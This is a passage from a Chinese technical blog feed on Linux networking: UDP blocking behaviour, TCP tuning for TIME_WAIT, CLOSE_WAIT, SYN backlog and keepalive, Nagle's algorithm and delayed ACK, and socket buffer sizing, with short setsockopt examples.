title="UDP阻塞和非阻塞下的数据发送接收"></a>UDP阻塞和非阻塞下的数据发送接收</h2><ol><li>UDP套接口有发送缓冲区大小（SO_SNDBUF修改），不过它仅仅是写到套接口的UDP数据报的大小上限，即UDP没有发送缓冲区。如果一个应用程序写一个大于套接口发送缓冲区大小的数据报，内核将返回EMSGSIZE错误。</li><li>从UDP套接口write成功返回仅仅表示用户写入的数据报或者所有片段已经加入到数据链路层的输出队列。如果该队列没有足够的空间存放该数据包或者它的某个片段，内核通常返回给应用进程一个ENOBUFS错误。</li><li>UDP是没有流量控制的：较快的发送端可以很容易淹没较慢的接收端，当接收缓冲区满后，后面收到的数据报都将丢弃。</li><li>UDP存在丢包的可能：调用recvfrom方法接收到数据后，处理数据花费时间太长，再次调用recvfrom，两次调用间隔里，发过来的包可能丢失。处理方法是调大接收缓冲区或者通过将接收到数据存入一个缓冲区，并迅速返回继续recvfrom。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">UDP socket 设置为的非阻塞模式 </span><br><span class="line">Len &#x3D; recvfrom(SocketFD, szRecvBuf, sizeof(szRecvBuf), MSG_DONTWAIT, (struct sockaddr *)&amp;SockAddr,&amp;ScokAddrLen);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UDP socket 设置为的阻塞模式 </span><br><span class="line">Len &#x3D; recvfrom(SocketFD, szRecvBuf, sizeof(szRecvBuf), 0, (struct sockaddr *)&amp;SockAddr,&amp;ScokAddrLen);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="阻塞、非阻塞的本质"><a href="#阻塞、非阻塞的本质" class="headerlink" title="阻塞、非阻塞的本质"></a>阻塞、非阻塞的本质</h2><p><img src="/2020/12/25/%E8%B0%88%E8%B0%88socket%E7%BC%93%E5%86%B2%E5%8C%BA/2.png" alt="image"></p><p>阻塞：阻塞的本质是，进程因为资源等待而主动让出CPU，进程从运行队列删除，幷加入到等待队列，然后等待资源。等超时或数据资源到来则唤醒进程继续执行，若有数据可读那就把数据拷贝给进程，无数据可读但超时了则返回进程继续执行后面的逻辑。</p><p>非阻塞：本质是应用进程掌控读取数据的节奏，通过轮训的方式查询数据是否可读，进程始终占用着CPU，能比较好地满足高性能进程需求，执行效率高（数据没到位，进程可以继续处理其他业务，无需阻塞其他业务进行）。</p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网络性能优化策略</title>
    <link href="/2020/12/18/%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5/"/>
    <url>/2020/12/18/%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5/</url>
    
    <content type="html"><![CDATA[<p>Linux网络性能优化实际优化的是Linux内核或者系统调用的几个参数，我们可以从应用程序、套接字、传输层、网络层以及链路层等几个角度，分别来看网络性能优化的基本思路。</p><p><img src="/2020/12/18/%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5/11.png" alt="image"></p><h2 id="网络性能指标"><a href="#网络性能指标" class="headerlink" title="网络性能指标"></a>网络性能指标</h2><ul><li>带宽：带宽，表示链路的最大传输速率，单位通常为 b/s （比特/秒）。</li><li>吞吐量：表示单位时间内成功传输的数据量，单位通常为 b/s（比特/秒）或者 B/s（字节/秒）。吞吐量受带宽限制，而吞吐量/带宽，也就是该网络的使用率。</li><li>延时：表示从网络请求发出后，一直到收到远端响应，所需要的时间延迟。在不同场景中，这一指标可能会有不同含义。比如，它可以表示，建立连接需要的时间（比如 TCP 握手延时），或一个数据包往返所需的时间（比如 RTT）。</li><li>PPS：是 Packet Per Second（包/秒）的缩写，表示以网络包为单位的传输速率。PPS 通常用来评估网络的转发能力，比如硬件交换机，通常可以达到线性转发（即PPS可以达到或者接近理论最大值）。而基于 Linux 服务器的转发，则容易受网络包大小的影响。</li></ul><p>除了这些指标，网络的可用性（网络能否正常通信）、并发连接数（TCP连接数量）、丢包率（丢包百分比）、重传率（重新传输的网络包比例）等也是常用的性能指标。</p><h2 id="网络收发包流程"><a href="#网络收发包流程" class="headerlink" title="网络收发包流程"></a>网络收发包流程</h2><p>这里介绍进程收到网络数据的整个流程：<br><img src="/2020/12/18/%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5/12.png" alt="image"></p><ol><li>一个网络帧到达网卡，网卡会通过DMA方式，<strong>把这个包放在接收队列里（Tx Ring buff）</strong>，然后通过硬中断，告诉网卡中断程序收到了网络包；</li><li>网卡中断程序会为该网络帧分配内核数据结构sk_buff(socket buffer)，再通过软中断告知内核收到了网络帧；</li><li>内核协议栈从sk_buff缓冲区将网络帧取出处理，由下至上解包处理该网络帧；</li><li>在链路层检查报文的合法性，找出上层协议的类型（比如 IPv4 还是 IPv6），再去掉帧头、帧尾，然后交给网络层；</li><li>网络层取出 IP 头，判断网络包下一步的走向，比如是交给上层处理还是转发。当网络层确认这个包是要发送到本机后，就会取出上层协议的类型（比如 TCP 还是 UDP），去掉 IP 头，再交给传输层处理。</li><li>传输层取出 TCP 头或者 UDP 头后，根据 &lt; 源 IP、源端口、目的 IP、目的端口 &gt; 四元组作为标识，找出对应的 Socket，<strong>并把数据拷贝到 Socket的接收缓存中，也就是TCP接收窗口</strong>。</li><li>最后，应用程序就可以使用 Socket read接口，程序会切换到内核区,并且会把 socket 接收缓冲区中的数据拷贝到用户区，拷贝后的数据会从 socket 缓冲区中移除。</li></ol><p><img src="/2020/12/18/%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5/13.png" alt="image"></p><p>上面的收包流程中深色标记了数据的存储位置，收到的数据一开始存储于内核专用的缓冲区，接收队列(ring buff)存的是指向这片区域的指针，后面数据被拷贝到sk_buff缓冲区（这个sk_ buff 形成的链表，就是常说的 socket 发送缓冲区），最后被拷贝到进程使用。</p><p>只在两种情况下创建 sk_ buff：</p><ol><li>应用程序给 socket 写入数据时。</li><li>当数据包到达 NIC 时。</li></ol><p>数据只会拷贝两次：</p><ol><li>用户空间与内核空间之间的拷贝（socket 的 read、write）。</li><li>sk_buff 与 NIC 之间的拷贝。</li></ol><h2 id="MTU大小（影响时延）"><a href="#MTU大小（影响时延）" class="headerlink" title="MTU大小（影响时延）"></a>MTU大小（影响时延）</h2><p>物理链路中并不能传输任意大小的数据包。网络接口配置的最大传输单元（MTU），就规定了最大的 IP 包大小。在我们最常用的以太网中，MTU 默认值是 1500（这也是 Linux 的默认值）。一旦网络包超过 MTU 的大小，就会在网络层分片，以保证分片后的 IP 包不大于 MTU 值。显然，MTU 越大，需要的分包也就越少，自然，网络吞吐能力就越好。因此我们可以根据 MTU 大小，调整发送的 数据包的大小，减少或者避免分片的发生。下图就表示了应用层的要发送的数据超过MTU后，会被分为多个包发送。</p><p><img src="/2020/12/18/%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5/14.png" alt="image"></p><h2 id="TCP优化"><a href="#TCP优化" class="headerlink" title="TCP优化"></a>TCP优化</h2><p>网络性能优化很大一部分就是在优化TCP的系统参数，因为操作系统一般设定的一些网络参数都较为保守，因为这些参数设为保守值那系统能稳定运行在各个环境上的能力就更强。但线上服务器都有自己的特殊处境，一个万金油的值并不能满足服务器的性能要求。一个典型的例子就是，局域网内网络环境都很好，因此没有必要严格遵循TCP那套拥塞控制策略，而是应想方法尽可能地提升传输性能。</p><p>先来一张TCP三次握手四次挥手的神图镇场。</p><p><img src="/2020/12/18/%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5/3.png" alt="image"></p><h3 id="1-TIME-WAIT过多（影响并发量，吞吐量）"><a href="#1-TIME-WAIT过多（影响并发量，吞吐量）" class="headerlink" title="1.TIME_WAIT过多（影响并发量，吞吐量）"></a>1.TIME_WAIT过多（影响并发量，吞吐量）</h3><p>在请求数比较大的场景下，你可能会看到大量处于 TIME_WAIT 状态的连接，它们会占用大量内存和端口资源。这时，我们可以优化与 TIME_WAIT 状态相关的内核选项，比如采取下面几种措施。</p><ul><li>增大处于 TIME_WAIT 状态的连接数量 net.ipv4.tcp_max_tw_buckets ，并增大连接跟踪表的大小 net.netfilter.nf_conntrack_max。</li><li>减小 net.ipv4.tcp_fin_timeout 和 net.netfilter.nf_conntrack_tcp_timeout_time_wait ，让系统尽快释放它们所占用的资源。</li><li>开启端口复用 net.ipv4.tcp_tw_reuse和设置net.ipv4.tcp_timestamps=1(默认即为1)。这样，被 TIME_WAIT 状态占用的端口，还能用到新建的连接中。</li><li>增大本地端口的范围 net.ipv4.ip_local_port_range 。这样就可以支持更多连接，提高整体的并发能力。</li><li>增加最大文件描述符的数量。你可以使用 fs.nr_open 和 fs.file-max ，分别增大进程和系统的最大文件描述符数；或在应用程序的 systemd 配置文件中，配置 LimitNOFILE ，设置应用程序的最大文件描述符数。</li></ul><p>值得注意的是，内核参数tcp_tw_recycle<strong>不建议</strong>打开，因为它的副作用是会拒绝所有比这个客户端时间戳更靠前的网络包，所以我方的就把带了“倒退”的时间戳的包当作是“recycle的tw连接的重传数据，不是新的请求”，于是丢掉不回包，造成大量丢包。但按包的时间戳来判定包是否是重传包并不靠谱，比如机器时钟并不一定相同。因此高版本的Linux已经把该参数废弃了。</p><p>除了上述方法可以移除系统中过多TIME_WAIT外，其实还可以使用SO_LIGNER参数快速关闭socket连接，不走TCP的四次挥手，而是使用RST快速关闭连接，这就避免了TIME_WAIT状态的产生。</p><p>回顾一下TCP关闭连接的两种方式：</p><ul><li>FIN：正常关闭，走4次挥手，优雅关闭，发送 FIN 包表示自己这端所有的数据都已经发送出去了，后面不会再发送数据</li><li>RST：处理异常情况，强制连接重置关闭，无法做出什么保证。</li></ul><p>scoket编程中通过linger结构体的l_onoff和l_linger来控制整个TCP关闭连接的行为。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linger</span> &#123;</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">int</span> l_onoff; <span class="comment">/* 0 = off, nozero = on */</span></span><br><span class="line">     <span class="keyword">int</span> l_linger; <span class="comment">/* linger time */</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linger</span> <span class="title">so_linger</span>;</span></span><br><span class="line">so_linger.l_onoff = <span class="number">1</span>;</span><br><span class="line">so_linger.l_linger = <span class="number">30</span>;</span><br><span class="line">z = setsockopt(s, SOL_SOCKET, SO_LINGER, &amp;so_linger,<span class="keyword">sizeof</span>(so_linger));</span><br></pre></td></tr></table></figure><ul><li>第一个字段 l_onoff 用来表示是否启用 linger 特性，非 0 为启用，0 为禁用 ，linux 内核默认为禁用。<br>禁用情况下, close函数立即返回，操作系统负责把缓冲队列中的数据全部发送至对端</li><li>第二个参数 l_linger 在 l_onoff 为非 0 （即启用特性）时才会生效。</li></ul><ol><li>如果 l_linger 的值为 0，那么调用 close，close 函数会立即返回，同时丢弃缓冲区内所有数据并立即发送 RST 包重置连接</li><li>如果 l_linger 的值为非 0，那么此时 close 函数在阻塞直到 l_linger 时间超时或者数据发送完毕，发送队列在超时时间段内继续尝试发送，如果发送完成则皆大欢喜，超时则直接丢弃缓冲区内容 并 RST 掉连接。</li></ol><h3 id="2-CLOSE-WAIT过多（影响并发量，吞吐量）"><a href="#2-CLOSE-WAIT过多（影响并发量，吞吐量）" class="headerlink" title="2.CLOSE_WAIT过多（影响并发量，吞吐量）"></a>2.CLOSE_WAIT过多（影响并发量，吞吐量）</h3><p>一般而言CLOSE_WAIT不会很多，但当程序发生异常时，该状态会大量出现，逐渐耗尽系统fd，影响网络并发连接数和吞吐量。</p><p>半关闭的状态下的服务器连接会处于 CLOSE_WAIT 状态，直到服务器发送了FIN。那么在应用层则是调用socket.close()会执行FIN的发送，如果服务器出现大量CLOSE_WAIT状态的连接，那么有可能的原因：</p><ol><li>服务器压力过大，根本来不及调用close存在连接泄露问题(Bug)，比如事务回滚耗费大量时间；</li><li>服务器未及时关闭连接。（更为常见，比如逻辑不严谨，跳过了close）。</li></ol><p>CLOSE_WAIT过多的唯一调优方法是：检查程序逻辑，确保socket.close不会异常跳过。当系统CLOSE_WAIT过多，但同时也不能杀死进程时，可以利用tcpkill等工具回收这些CLOSE_WAIT状态的僵死连接。</p><p>当系统出现大量量CLOSE_WAIT后该如何处理，方法有2：</p><ol><li>杀死进程，就是释放进程内使用到的socket连接，因此CLOSE_WAIT的连接就会清理掉。</li><li>利用tcpkill、killcx相关工具或自己编写脚本，原理就是构造假的RST包发给对方，让对方主动断掉这条连接。那RST包的seq怎么获取呢，这是个难题，因为只有落在SEQ号落在滑动窗口内的包才会处理，否则这些包都会被丢弃。思路就是主动给模拟发一个SYN包，Linux 内核对于收到的乱序 SYN 报文，会回复一个携带了正确序列号和确认号的 ACK 报文，这个 ACK 被称之为 Challenge ACK，此时我们就获得了正确的SEQ和ACK了。最后再按照该SEQ和ACK构造RST包发给B，B收到后就会关闭连接了。此方法适合关闭所有非僵死的TCP连接。</li></ol><p>知识点补充：系统收到RST包后会就会KILL掉这条连接，回收socket资源。阻塞模型下，内核无法主动通知应用层出错，只有应用层主动调用read()或者write()这样的IO系统调用时，内核才会利用出错来通知应用层对端RST。非阻塞模型下，select或者epoll会返回sockfd可读，应用层对其进行读取时，read()会报错RST（-1）。第一次read是返回-1，后续继续读返回将会是0。</p><p><img src="/2020/12/18/%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5/21.png" alt="image"></p><p>CLOSE_WAIT意味着操作系统知道远程应用程序已关闭连接并等待本地应用程序也这样做，操作系统并没有提供 相应的TCP参数来解决此问题，因为操作系统并不知道你的程序是否还在处理重要数据，系统主动关闭CLOSE_WAIT连接并不安全。所以最好的 办法是检查拥有本地主机上的连接的应用程序。由于没有CLOSE_WAIT超时，连接可以永远保持这种状态（或者至少在程序最终关闭连接或进程存在或被杀死之前）。当确认了直接KILL socket连接不会对业务逻辑有影响时，才可以考虑使用KILLCX等工具。</p><h3 id="3-SYN-FLOOD（影响吞吐和并发数）"><a href="#3-SYN-FLOOD（影响吞吐和并发数）" class="headerlink" title="3.SYN FLOOD（影响吞吐和并发数）"></a>3.SYN FLOOD（影响吞吐和并发数）</h3><p>为了缓解 SYN FLOOD 等，利用 TCP 协议特点进行攻击而引发的性能问题，你可以考虑优化与 SYN 状态相关的内核选项，比如采取下面几种措施。</p><p><img src="/2020/12/18/%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5/20.png" alt="image"></p><ul><li>增大 TCP 半连接的最大数量 net.ipv4.tcp_max_syn_backlog ，或者开启 TCP SYN Cookies net.ipv4.tcp_syncookies ，来绕开半连接数量限制的问题（注意，这两个选项不可同时使用）。</li><li>减少 SYN_RECV 状态的连接重传 SYN+ACK 包的次数 net.ipv4.tcp_synack_retries。</li></ul><h3 id="4-Keepalive（影响吞吐和并发量）"><a href="#4-Keepalive（影响吞吐和并发量）" class="headerlink" title="4.Keepalive（影响吞吐和并发量）"></a>4.Keepalive（影响吞吐和并发量）</h3><p>如果一个给定的连接在两小时内（默认时长）没有任何的动作，则服务器就向客户发一个探测报文段，客户主机必须处于以下4个状态之一：</p><ol><li><p>客户主机依然正常运行，并从服务器可达。客户的TCP响应正常，而服务器也知道对方是正常的，服务器在两小时后将保活定时器复位。</p></li><li><p>客户主机已经崩溃，并且关闭或者正在重新启动。在任何一种情况下，客户的TCP都没有响应。服务端将不能收到对探测的响应，并在75秒后超时。服务器总共发送10个这样的探测 ，每个间隔75秒。如果服务器没有收到一个响应，它就认为客户主机已经关闭并终止连接。</p></li><li><p>客户主机崩溃并已经重新启动。服务器将收到一个对其保活探测的响应，这个响应是一个复位（RST），使得服务器终止这个连接。</p></li><li><p>客户机正常运行，但是服务器不可达，这种情况与2类似，TCP能发现的就是没有收到探测的响应。</p></li></ol><p>对于linux内核来说，应用程序若想使用TCP Keepalive，需要设置SO_KEEPALIVE套接字选项才能生效。</p><p>在长连接的场景中，通常使用 Keepalive 来检测 TCP 连接的状态，以便对端连接断开后，可以自动回收。但是，系统默认的 Keepalive 探测间隔和重试次数，一般都无法满足应用程序的性能要求，一般而言，打开了keepalive功能但没做参数优化，那建议不要打开了，因为tcp 默认的keepalive参数效率太低了。看看这些默认的参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;tcp_keepalive_time  </span><br><span class="line">7200  </span><br><span class="line">  </span><br><span class="line"># cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;tcp_keepalive_intvl  </span><br><span class="line">75  </span><br><span class="line">  </span><br><span class="line"># cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;tcp_keepalive_probes  </span><br><span class="line">9  </span><br></pre></td></tr></table></figure><p>2小时才发一次心跳包，心跳包没收到回复后继续探测间隔是75秒，一共重试9次才认为当前连接已经关闭。这样一算下来，一旦对方已经挂了，自己还继续等待2个多小时才会释放该socket，那socket的利用率实在太低了。</p><p>所以，这时候你需要优化与 Keepalive 相关的内核选项，比如：</p><ul><li>缩短最后一次数据包到 Keepalive 探测包的间隔时间 net.ipv4.tcp_keepalive_time；</li><li>缩短发送 Keepalive 探测包的间隔时间 net.ipv4.tcp_keepalive_intvl；</li><li>减少 Keepalive 探测失败后，一直到通知应用程序前的重试次数 net.ipv4.tcp_keepalive_probes。</li></ul><p><img src="/2020/12/18/%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5/15.png" alt="image"></p><h3 id="5-Nagle算法和延迟ACK导致的网络延时（影响时延）"><a href="#5-Nagle算法和延迟ACK导致的网络延时（影响时延）" class="headerlink" title="5.Nagle算法和延迟ACK导致的网络延时（影响时延）"></a>5.Nagle算法和延迟ACK导致的网络延时（影响时延）</h3><p>Nagle算法和delay ack机制是减少发送端和接收端包量的两个机制，可以有效减少网络包量，避免拥塞。但是，在特定场景下，Nagle算法要求网络中只有一个未确认的包， 而delay ack机制需要等待更多的数据包， 再发送ACK回包， 导致发送和接收端等待对方发送数据， 造成死锁， 只有当delay ack超时或者发送方等待超时后才能解开死锁，进而导致应用侧对外的延时高。 </p><p>Nagle算法主要是避免发送小的数据包，<strong>要求TCP连接上最多只能有一个未被确认的小分组，在该分组的确认到达之前不能发送其他的小分组</strong>。相反，TCP收集这些少量的小分组，并在接收方的确认到来时以一个分组的方式发出去。</p><p>考虑发送一个字节的的情景，每次发送一个字节的有用数据，就会产生41个字节长的分组，20个字节的IP Header 和 20个字节的TCP Header，这就导致了1个字节的有用信息要浪费掉40个字节的头部信息，这是一笔巨大的字节开销，而且这种Small packet在广域网上会增加拥塞的出现。<strong>因此Nagle算法是用于缓解网络拥塞的优化手段</strong>。该算法的优越之处在于它是自适应的，确认到达的越快，数据也就发送的越快。</p><p>Nagle核心算法思想:一个TCP连接上最多只能有一个未被确认的小数据包，在该分组的确认到达之前，不能发送其他的小数据包。数据发送时是否选择立即发送判定步骤如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 如果发送内容&gt;&#x3D;1个MSS， 立即发送；</span><br><span class="line">2. 如果之前没有包未被确认， 立即发送；</span><br><span class="line">3. 如果之前有包未被确认， 缓存发送内容；</span><br><span class="line">4. 如果收到ack， 立即发送缓存的内容。</span><br><span class="line">5. 上述条件都未满足，但发生了超时（一般为200ms），则立即发送。</span><br></pre></td></tr></table></figure><p>这里介绍一下MSS和MTU。</p><p>网络 MTU (Maximum Transmission Unit，最大传输单元) 表示网络一次传输的最大数据字节数 (不包括网络封装占用字节数)，通常 MTU 是网络硬件规定的。 对于最常用的以太网，MTU 是 1500 字节。</p><p>TCP MSS (Maximum Segment Size，最大分节大小)，用于告诉 TCP 对端在每个分节中能够发送的最大 TCP 数据量。 MSS 的目的是告诉对端其重组缓冲区大小的实际值，从而试图避免分片。 MSS 经常设置成为 MTU (1500) - IP 固定长度 (20) - TCP 固定长度 (20) = 1460 字节，IPv6 是 1440 字节，因为 IPv6 长度为 40 字节。</p><p>延迟ACK的核心思想与Nagle思想是一致的，只是一个针对发送方，一个针对接收方。延迟ack：如果tcp对每个数据包都发送一个ack确认，那么只是一个单独的数据包为了发送一个ack代价比较高，所以tcp会延迟一段时间，如果这段时间内有数据发送到对端，则捎带发送ack，如果在延迟ack定时器触发时候（超时了），发现ack尚未发送，则立即单独发送，<strong>因此延迟ACK同样是用于缓解网络拥塞的优化手段</strong>。</p><p>Nagle算法关联的socket 参数是TCP_NODELAY，与延迟ACK关联的参数是TCP_QUICKACK，TCP_NODELAY针对的是数据发送方，TCP_QUICKACK针对的是数据接收方。</p><p>TCP_NODELAY：该参数设置后就是关闭了Nagle算法，即发送数据时不管包的大小，一律立即发送。</p><p>TCP_QUAICLACK: 该参数设置后表示关闭延迟ack, 表示接收到数据之后立即回复ACK。</p><p>观察下面这个案例，左侧是客户端，右侧是服务端，从下图可以看出，前面三次握手，以及第一次 HTTP 请求和响应还是挺快的，但第二次 HTTP 请求就比较慢了，特别是客户端在收到服务器第一个分组后，40ms 后才发出了 ACK 响应（图中蓝色行）。实际上，该延时是TCP 延迟确认（Delayed ACK）导致的，延时的时间就是TCP 延迟确认的最小超时时间40ms，这是个神奇的40ms，如果以后一看到40ms这个值时，需条件反射想到是否是delay ack或者是Nagle算法的40ms。</p><p><img src="/2020/12/18/%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5/16.png" alt="image"></p><p>再看下面的案例：客户端需要发送2062字节数据，然后从服务器读取响应。</p><p>通过wireshark抓包，数据分成了1460字节和602字节两段发送。<br>如图所示：发送第一段1460字节后，服务器等待40ms后才发送ACK；客户端也是收到ACK后才发送第二段的602字节。</p><p><img src="/2020/12/18/%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5/17.png" alt="image"></p><p>现象看起来跟Nalge算法和ACK延迟确认机制相符。首先一次发送的数据量已经超过了MTU（2062 &gt; 1460），因此被分片了。客户端发送的第一段数据大小满足MSS，立即发送。服务器收到后因为要等待接收剩下的602个字节，所以没有发送响应数据，也就不能携带ACK，导致ACK延迟。客户端第二段602字节数据因为第一段数据没有确认而被延迟发送，直到40ms后收到ACK。因此条件反射想到是TCP_QUICKACK或者TCP_NODELAY没有开启，检查代码后发现确实TCP_QUICKACK和TCP_NODELAY都没开启，因此主动打开即可修复。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">recv(fd, rcvBuf, 132, 0); </span><br><span class="line">setsockopt(fd, IPPROTO_TCP, TCP_QUICKACK, (int[])&#123;1&#125;, sizeof(int)); </span><br></pre></td></tr></table></figure><p>注意，TCP_QUICKACK需要在每次调用recv后重新设置，因为map tcp中明确提到该设置并非设置后就永久不变的：</p><p><img src="/2020/12/18/%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5/18.png" alt="image"></p><p>针对数据发送方的禁用Nagle算法可以这个操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setsockopt(client_fd, SOL_TCP, TCP_NODELAY,(int[])&#123;1&#125;, sizeof(int));</span><br></pre></td></tr></table></figure><p>TCP的延时确认以及Nagle算法，从思想看都是一致的，都是通过延迟发送来减轻网络传输负担。不用每次请求都发送一个网络包，而是先等一会儿（比如 40ms），看看有没有“顺风车”或者是否有还要发送的数据。如果这段时间内，正好有其他包需要发送，那就捎带着 ACK 或本次数据 一起发送过去。当然，如果一直等不到其他包，那就超时后单独发送。<strong>但是我们再网路负载不严重的情况下（比如在局域网内），ack delay和nagle算法对于我们来说并无太大意义，而且还增加了我们的网络延时</strong>。</p><p>在默认的情况下,Nagle算法和延迟ACK是默认开启，也就是说TCP_NODELAY和TCP_QUICKACK默认关闭。如果服务器开启延迟ACK、客户端开启Nagle算法 ，就很容易导致网络延迟增大。<strong>所以为了减少网络时延，可以开启TCP_NODELAY 和TCP_QUICKACK</strong>。</p><h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><p>UDP 提供了面向数据报的网络协议，它不需要网络连接，也不提供可靠性保障。所以，UDP 优化，相对于 TCP 来说，要简单得多。这里我也总结了常见的几种优化方案。</p><ul><li>跟上篇套接字部分提到的一样，增大套接字缓冲区大小以及 UDP 缓冲区范围；</li><li>跟前面 TCP 部分提到的一样，增大本地端口号的范围；</li><li>根据 MTU 大小，调整 UDP 数据包的大小，减少或者避免分片的发生。</li></ul><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><p>应用层的网络协议优化，也是至关重要的一点。我总结了常见的几种优化方法。</p><ul><li>使用长连接取代短连接，可以显著降低 TCP</li><li>建立连接的成本。在每秒请求次数较多时，这样做的效果非常明显。</li><li>使用内存等方式，来缓存不常变化的数据，可以降低网络 I/O 次数，同时加快应用程序的响应速度。</li><li>使用 Protocol Buffer 等序列化的方式，压缩网络 I/O 的数据量，可以提高应用程序的吞吐。</li><li>使用 DNS 缓存、预取、HTTPDNS 等方式，减少 DNS 解析的延迟，也可以提升网络 I/O 的整体速度。</li><li>I/O 多路复用技术 epoll</li><li>使用异步 I/O（Asynchronous I/O，AIO）</li><li>主进程 + 多个 worker 子进程。</li><li>听到相同端口的多进程模型。在这种模型下，所有进程都会监听相同接口，并且开启 SO_REUSEPORT 选项，由内核负责，把请求负载均衡到这些监听进程中去。</li></ul><h2 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h2><p>为了提高网络的吞吐量，你通常需要调整这些缓冲区的大小。比如：</p><ul><li>增大每个套接字的缓冲区大小 net.core.optmem_max；</li><li>增大套接字接收缓冲区大小 net.core.rmem_max 和发送缓冲区大小 net.core.wmem_max；</li><li>增大 TCP 接收缓冲区大小 net.ipv4.tcp_rmem 和发送缓冲区大小 net.ipv4.tcp_wmem。</li><li>使用 SO_SNDBUF 和 SO_RCVBUF ，可以分别调整套接字发送缓冲区和接收缓冲区的大小。</li></ul><p>内核选项的范围是全局的，套接字接口里面设置的是单个，如SO_SNDBUF设置得是当前socket发送缓冲区的大小。</p><p><img src="/2020/12/18/%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5/19.png" alt="image"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>在应用程序中，主要是优化 I/O 模型、工作模型以及应用层的网络协议；</li><li>在套接字层中，主要是优化套接字的缓冲区大小；</li><li>在传输层中，主要是优化 TCP 和 UDP 协议；</li><li>在网络层中，主要是优化路由、转发、分片以及 ICMP 协议；</li><li>最后，在链路层中，主要是优化网络包的收发、网络功能卸载以及网卡选项。</li></ul>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>计算机网络</tag>
      
      <tag>性能优化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>谈谈缺页、swap、惰性分配和overcommit</title>
    <link href="/2020/12/12/%E8%B0%88%E8%B0%88%E7%BC%BA%E9%A1%B5%E3%80%81swap%E3%80%81%E6%83%B0%E6%80%A7%E5%88%86%E9%85%8D%E5%92%8Covercommit/"/>
    <url>/2020/12/12/%E8%B0%88%E8%B0%88%E7%BC%BA%E9%A1%B5%E3%80%81swap%E3%80%81%E6%83%B0%E6%80%A7%E5%88%86%E9%85%8D%E5%92%8Covercommit/</url>
    
